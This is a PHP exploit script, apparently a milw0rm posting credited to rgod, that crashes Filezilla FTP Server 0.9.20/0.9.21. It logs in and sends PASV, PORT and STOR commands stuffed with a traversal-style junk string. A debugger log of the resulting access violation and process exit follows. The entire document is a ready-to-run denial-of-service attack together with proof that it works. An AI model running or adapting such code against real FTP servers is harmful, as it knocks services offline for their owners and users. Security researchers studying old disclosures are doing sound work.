<?php

# Filezilla FTP Server 0.9.20 beta / 0.9.21 "STOR" Denial Of Service
# by rgod
# mail: retrog at alice dot it
# site: http://retrogod.altervista.org

# tested on WinXP sp2

error_reporting(E_ALL);

$service_port = getservbyname('ftp', 'tcp');
$address = gethostbyname('192.168.1.3');

$user="test";
$pass="test";

$junk.="../../../sun-tzu/../../../sun-tzu/../../../sun-tzu";

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket < 0) {
   echo "socket_create() failed:\n reason: " . socket_strerror($socket) . "\n";
} else {
   echo "OK.\n";
}

$result = socket_connect($socket, $address, $service_port);
if ($result < 0) {
   echo "socket_connect() failed:\n reason: ($result) " . socket_strerror($result) . "\n";
} else {
   echo "OK.\n";
}

$out=socket_read($socket, 240);
echo $out;

$in = "USER ".$user."\r\n";
socket_write($socket, $in, strlen ($in));

$out=socket_read($socket, 80);
echo $out;

$in = "PASS ".$pass."\r\n";
socket_write($socket, $in, strlen ($in));

$out=socket_read($socket, 80);
echo $out;

$in = "PASV ".$junk."\r\n";
socket_write($socket, $in, strlen ($in));

$in = "PORT ".$junk."\r\n";
socket_write($socket, $in, strlen ($in));

$in = "STOR ".$junk."\r\n";
socket_write($socket, $in, strlen ($in));

socket_close($socket);

/*
07:04:28.270  pid=0F84 tid=03A0  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION writing [0000007C])
              ----------------------------------------------------------------
              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00476540: 0A 00 00 00 43 00 44 00-55 00 50 00 00 00 00 00
              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00D7E2F4: 00 00 00 00 A8 56 37 00-00 00 00 00 00 00 00 00
              ESP=00D7E2C8: 00 00 00 00 F0 6E 37 00-2F 93 41 00 F4 E2 D7 00
              EBP=0000000C: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000060: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=00449427: C6 46 7C 01 8B 4F 18 B8-08 00 00 00 3B C8 72 05
                            --> MOV BYTE PTR [ESI+7C],01
              ----------------------------------------------------------------

07:04:28.330  pid=0F84 tid=03A0  EXCEPTION (unhandled)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION writing [0000007C])
              ----------------------------------------------------------------
              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00476540: 0A 00 00 00 43 00 44 00-55 00 50 00 00 00 00 00
              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00D7E2F4: 00 00 00 00 A8 56 37 00-00 00 00 00 00 00 00 00
              ESP=00D7E2C8: 00 00 00 00 F0 6E 37 00-2F 93 41 00 F4 E2 D7 00
              EBP=0000000C: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000060: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=00449427: C6 46 7C 01 8B 4F 18 B8-08 00 00 00 3B C8 72 05
                            --> MOV BYTE PTR [ESI+7C],01
              ----------------------------------------------------------------

07:04:28.330  pid=0F84 tid=0104  Thread exited with code 3221225477
07:04:28.380  pid=0F84 tid=0F18  Thread exited with code 3221225477
07:04:28.380  pid=0F84 tid=03A0  Thread exited with code 3221225477
07:04:28.380  pid=0F84 tid=04E4  Thread exited with code 3221225477
07:04:28.390  pid=0F84 tid=053C  Thread exited with code 3221225477
07:04:28.390  pid=0F84 tid=0780  Process exited with code 3221225477

*/

?>

# milw0rm.com [2006-12-09]
